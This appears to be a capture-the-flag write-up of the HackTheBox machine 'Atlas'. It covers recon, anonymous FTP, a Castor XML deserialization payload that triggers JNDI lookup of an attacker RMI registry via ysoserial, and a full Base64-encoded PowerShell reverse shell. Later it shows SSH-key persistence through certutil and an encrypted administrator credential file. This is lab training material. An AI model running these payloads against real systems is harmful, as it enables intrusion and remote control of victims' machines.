---
title: Atlas
date: 2026-02-14
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - java-xml-marshallers
lastmod: 2026-02-23T14:19:12.739Z
---
# Box Info

Atlas is a Hard difficulty machine that demonstrates advanced exploitation techniques through Java deserialization vulnerabilities and .NET cryptographic analysis. The machine features a Spring Boot web application using the vulnerable Castor XML library for marshalling / un-marshalling operations, leading to remote code execution via Java RMI exploitation. Privilege escalation involves reverse engineering a .NET `WinSSHTerm` application, performing cryptographic analysis of AES-256-CBC encryption with PBKDF2-SHA1 key derivation, and recovering administrator credentials through password brute-forcing and dynamic debugging techniques.

***

# Recon 10.129.238.8

### PORT & IP SCAN

The `nmap` reveal that the machine is that allows the ftp anonymous login ,and show the ,atlas-pilot-1.0.0-SNAPSHOT.jar , atlas\_generator.zip , and the 3389 show the DNS with ATLAS, and the 8080 is running the tomcat .  with the windows a stand-alone machine.

```shell
──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.238.8 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-14 13:46 +0800
Nmap scan report for 10.129.238.8
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.7.2
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp        22851463 Jul 03  2023 atlas-pilot-1.0.0-SNAPSHOT.jar
|_-r--r--r-- 1 ftp ftp          586379 Jul 03  2023 atlas_generator.zip
| tls-alpn: 
|_  ftp
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Not valid before: 2023-06-30T15:35:45
|_Not valid after:  2024-06-30T15:40:45
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ATLAS
|   NetBIOS_Domain_Name: ATLAS
|   NetBIOS_Computer_Name: ATLAS
|   DNS_Domain_Name: ATLAS
|   DNS_Computer_Name: ATLAS
|   Product_Version: 10.0.19041
|_  System_Time: 2026-02-14T05:46:44+00:00
| ssl-cert: Subject: commonName=ATLAS
| Not valid before: 2025-10-08T22:02:25
|_Not valid after:  2026-04-09T22:02:25
|_ssl-date: 2026-02-14T05:46:48+00:00; 0s from scanner time.
8080/tcp open  http          Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
```

### FTP 21

The `nmap` scan reveals that Anonymous FTP login is enabled. Logging in with `anonymous:anonymous` grants access to two highly interesting files, which we immediately download for offline analysis:

* `atlas-pilot-1.0.0-SNAPSHOT.jar`

* `atlas_generator.zip`

```
anonymous : anonymous
```

```shell
└─#  ftp 10.129.238.8
Connected to 10.129.238.8.
220-FileZilla Server 1.7.2
220 Please visit https://filezilla-project.org/
Name (10.129.238.8:root): anonymous
331 Please, specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||50335|)
150 Starting data transfer.
-r--r--r-- 1 ftp ftp        22851463 Jul 03  2023 atlas-pilot-1.0.0-SNAPSHOT.jar
-r--r--r-- 1 ftp ftp          586379 Jul 03  2023 atlas_generator.zip
226 Operation successful
ftp> get atlas_generator.zip
local: atlas_generator.zip remote: atlas_generator.zip
229 Entering Extended Passive Mode (|||50233|)
150 Starting data transfer.
100% |************************************************************************************************************************************************|   572 KiB    1.10 MiB/s    00:00 ETA
226 Operation successful
586379 bytes received in 00:00 (1.10 MiB/s)
ftp> get atlas-pilot-1.0.0-SNAPSHOT.jar
local: atlas-pilot-1.0.0-SNAPSHOT.jar remote: atlas-pilot-1.0.0-SNAPSHOT.jar
229 Entering Extended Passive Mode (|||50242|)
150 Starting data transfer.
100% |************************************************************************************************************************************************| 22315 KiB    1.28 MiB/s    00:00 ETA
226 Operation successful
22851463 bytes received in 00:16 (1.28 MiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# unzip atlas_generator.zip            
Archive:  atlas_generator.zip
   creating: .mvn/
   creating: .mvn/wrapper/
  inflating: .mvn/wrapper/maven-wrapper.jar  
  inflating: .mvn/wrapper/maven-wrapper.properties  
  inflating: build.gradle            
   creating: gradle/
  inflating: gradlew                 
  inflating: gradlew.bat             
   creating: gradle/wrapper/
  inflating: gradle/wrapper/gradle-wrapper.jar  
  inflating: gradle/wrapper/gradle-wrapper.properties  
  inflating: mvnw                    
  inflating: mvnw.cmd                
  inflating: pom.xml                 
 extracting: settings.gradle         
   creating: src/
   creating: src/main/
   creating: src/main/java/
   creating: src/main/java/com/
   creating: src/main/java/com/example/
   creating: src/main/java/com/example/uploadingfiles/
  inflating: src/main/java/com/example/uploadingfiles/Client.java  
  inflating: src/main/java/com/example/uploadingfiles/Employee.java  
  inflating: src/main/java/com/example/uploadingfiles/FileUploadController.java  
  inflating: src/main/java/com/example/uploadingfiles/UploadingFilesApplication.java  
   creating: src/main/resources/
  inflating: src/main/resources/application.properties  
   creating: src/main/resources/static/
  inflating: src/main/resources/static/59f86e9a43e6f89908a4f0b948915bef.png  
  inflating: src/main/resources/static/7363804265c4c8b8ca3f6e25a3e432c6.png  
  inflating: src/main/resources/static/e43471533678310ee5007162c051d5eb.png  
  inflating: src/main/resources/static/mapping.xml  
  inflating: src/main/resources/static/reset-fonts-grids.css  
  inflating: src/main/resources/static/resume.css  
  inflating: src/main/resources/static/rocket.png  
   creating: src/main/resources/templates/
  inflating: src/main/resources/templates/srt-resume.html  
  inflating: src/main/resources/templates/uploadForm.html  
  inflating: src/main/resources/templates/xmlTemplate.html  
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# ls
atlas_generator.zip             build.gradle  gradlew      mvnw      openPort.txt  serviceScan.txt  spring-boot.txt
atlas-pilot-1.0.0-SNAPSHOT.jar  gradle        gradlew.bat  mvnw.cmd  pom.xml       settings.gradle  src

```

### Web Recon 80

Navigating to port 8080 reveals a web application with a file upload feature. Based on the UI and our downloaded files, this application processes XML templates to generate resumes.\
![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)

### XML File upload observer

Unzipping `atlas_generator.zip` reveals the source code for a Spring Boot application. Digging into the directory structure (`src/main/java/com/example/uploadingfiles/`), we locate the `FileUploadController.java` file.

Reviewing the code reveals how the application handles the uploaded XML files. It uses the **Castor XML library** to unmarshal (deserialize) the incoming XML data into Java objects.

![Pasted image 20260214142239.png](/ob/Pasted%20image%2020260214142239.png)

![Pasted image 20260214143153.png](/ob/Pasted%20image%2020260214143153.png)

![Pasted image 20260214142445.png](/ob/Pasted%20image%2020260214142445.png)

![Pasted image 20260214142511.png](/ob/Pasted%20image%2020260214142511.png)

![Pasted image 20260214142637.png](/ob/Pasted%20image%2020260214142637.png)

### Source Review

After the xml download , we can modify the template , and use the java to generate the new payload to point our 1099 rmi by using the marshal exploit

They use the marshal to do the xml to java that may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath

Because the unmarshalling process is not strictly validated, it is vulnerable to **Java Deserialization**. Specifically, we can craft an XML payload that forces the Spring application to instantiate a `PropertyPathFactoryBean`. This allows us to perform a **JNDI Injection** attack by forcing the server to look up an object on an external, attacker-controlled RMI registry.

Reference for marshallers unmarshaller  https://blog.csdn.net/qq496013218/article/details/74204782

Reference for marshallers exploit https://www.tenable.com/cve/CVE-2023-46604

poc github : https://github.com/mbechler/marshalsec

![Pasted image 20260214143130.png](/ob/Pasted%20image%2020260214143130.png)

![Pasted image 20260223143030.png](/ob/Pasted%20image%2020260223143030.png)

***

# Shell as john

### Setting up ysoserial

{{< toggle "Tag 🏷️" >}}

{{< tag "java-xml-marshallers" >}} The web has the xml file upload function , and after check the source code knew the website used the unmarshallers java module to handle the xml which is the old version that is the CVE-2023-46604 (you can check the source code without source code to try it ), we can exploit it by used the ysoserial in docker to ping back us as the POC . Finally to use the base64 powershell to have the RCE

{{< /toggle >}}

![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)

java marshallers deserialization

To exploit this, we need to stand up a malicious RMI registry and deliver a payload that executes commands on the target.

To avoid cluttering the local host's Java environment, `ysoserial` is run via a Docker container. We bind port `1099` (the default RMI port) to the container.

```
FROM maven:3.9.9-eclipse-temurin-8

WORKDIR /opt/ysoserial

RUN git clone https://github.com/frohoff/ysoserial.git .

RUN mvn -q -DskipTests package

ENTRYPOINT ["bash"]
```

```
# Start the ysoserial Docker container
sudo docker run -it --rm -p 1099:1099 ysoserial-java8

# Start the JRMPListener hosting the CommonsBeanutils1 payload
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping 10.10.14.11'
```

```
sudo docker run -it --rm  -p 1099:1099 ysoserial-java8
```

*Note: We initially use a `ping` command and monitor with `sudo tcpdump -i tun0 icmp` to confirm code execution.*

```
sudo tcpdump -i tun0 icmp 
```

***

### Crafting the Malicious XML

upload the xml to web , and remark rmi://10.10.14.11/a , `rmi` already is the  port 1099 , so we dont need special say to rmi://10.10.14.11:1099/a , and open the burpsuite to easily send to repester to send again

We modify a valid XML resume template to include our JNDI injection payload. We set the `target-bean-name` and `shareable-resource` to point to our malicious RMI registry (`rmi://10.10.14.11/a`).

```
<?xml version="1.0" encoding="UTF-8"?>

<Employee id="101"><name xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>rmi://10.10.14.11/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>rmi://10.10.14.11/a</shareable-resource></bean-factory></name><talent-titles>Navigation</talent-titles><talent-titles>Warp Engine</talent-titles><talent-titles>Project Direction</talent-titles><talent-textes>Assertively exploit wireless initiatives rather than synergistic core competencies.</talent-textes><talent-textes>Credibly streamline mission-critical value with multifunctional functionalities.</talent-textes><talent-textes>Proven ability to lead and manage a wide variety of design and development projects in team and independent situations.</talent-textes><skills>Mining</skills><skills>Ship Building</skills><skills>Gravity Science</skills><skills>Alien Communication</skills><skills>Planetology</skills><skills>Zero Trust Tools</skills><skills>Satellite Engineering</skills><skills>Rocket Science</skills><skills>Moon Walks</skills><profile>Progressively evolve cross-platform ideas before impactful infomediaries. Energistically visualize tactical initiatives before cross-media catalysts for change.</profile><phone>(313) - 867-5309</phone><email>jonathan@starfield.com</email><education-text>Dual Major, Robotics and Starships - 4.0 GPA</education-text><education-title>NASA University - Bloomington, Indiana</education-title><title>ROCKET TESTER, PILOT</title></Employee>
```

![Pasted image 20260223140237.png](/ob/Pasted%20image%2020260223140237.png)

![Pasted image 20260223140212.png](/ob/Pasted%20image%2020260223140212.png)

![Pasted image 20260223140757.png](/ob/Pasted%20image%2020260223140757.png)

### RCE

After confirming execution via ICMP, we swap the `ping` command in our `ysoserial` listener for a Base64-encoded PowerShell reverse shell. Using Base64 prevents any bad character or parsing issues during execution.

![Pasted image 20260223140952.png](/ob/Pasted%20image%2020260223140952.png)

```
root@aaa47bf7ca7c:/opt/ysoserial# java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

Catching the connection on our Netcat listener, we successfully gain a reverse shell as the user `john`.\
![Pasted image 20260223141248.png](/ob/Pasted%20image%2020260223141248.png)

### Setting Up Persistent Access

```
└─#  ssh-keygen -t ed25519 -C "tester@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519): 
/root/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:PHUJ6pmgSR0gQGRBJ6SZzbyiR3yTrqHgtSN8OSiQpDg tester@kali-20260223
The key's randomart image is:
+--[ED25519 256]--+
|*Xo....   .      |
|o*o. . . . . .   |
|+ + . o . . o    |
| o o + + + .     |
|=.+ *   S        |
|Eo o .   .       |
|=.+.o            |
|+*.B.            |
|o.+.o            |
+----[SHA256]-----+
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# cd ~/.ssh/      
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/.ssh]
└─# sudo python3 -m http.server 80                           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...


```

```
PS C:\Users\John> mkdir C:\Users\John\.ssh


    Directory: C:\Users\John


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        23/02/2026     13:32                .ssh                                                                 


PS C:\Users\John> cd .ssh
PS C:\Users\John\.ssh> certutil -urlcache -split -f http://10.10.14.11:80/id_ed25519.pub C:\Users\John\.ssh\authorized_keys
****  Online  ****
  0000  ...
  0066
CertUtil: -URLCache command completed successfully.


```

```
ssh -i ~/.ssh/id_ed25519  john@10.129.238.8
```

***

### Finding WinSSHTerm Credentials

Digging through John's files, we find WinSSHTerm (an SSH client) in the Downloads folder:

```
john@ATLAS C:\Users\John\Downloads>tree /f WinSSHTerm        
Folder PATH listing
Volume serial number is 00000099 C6FD:5949
C:\USERS\JOHN\DOWNLOADS\WINSSHTERM
│   README.txt
│   WinSSHTerm.exe
│
├───config
│       connections.xml
│       key
│       layout.xml
│       preferences.xml
│
└───tools

john@ATLAS C:\Users\John\Downloads>

```

**`connections.xml`** reveals a saved connection:

The administrator's SSH password is right there -- encrypted. Time for some reverse engineering.

```
<?xml version="1.0" encoding="utf-8"?>
<WinSSHTerm Version="1" VerifyKey="j6JcYjnkh7coSbefT7+8jHI+49cgPWAt4XHQ76M6Op0jEzaa+QxpxEk4T9ci9P8wLgORRde5KSb3TmT05AnfWQ==">
    <Node Name="Admin SSH" Type="Connection" Descr="" Username="administrator" Password="VmgFP/ooNadVdVQI5UmW3e5dISTQG8+fQ+wMJHtaATFI46G73XREnctiYbOdPYNR" PrivateKey="" Hostname="127.0.0.1" Port="22" CustomPath="" LoginCmds="" CmdLineAr
gs="" EnvCol="" CustomId="" cfProt="" cfLogFile="" cfLogLevel="" sAgentFwd="" sTermType="" sLogType="" sLogFileName="" sTCP="" sX11="" sSb="" sCS="" sCSHR="" pSshProxy="disabled" pType="Jump Server" pHost="" pPort="22" pUser="" pPasswor
d="" pPrivKey="" />
</WinSSHTerm>
```
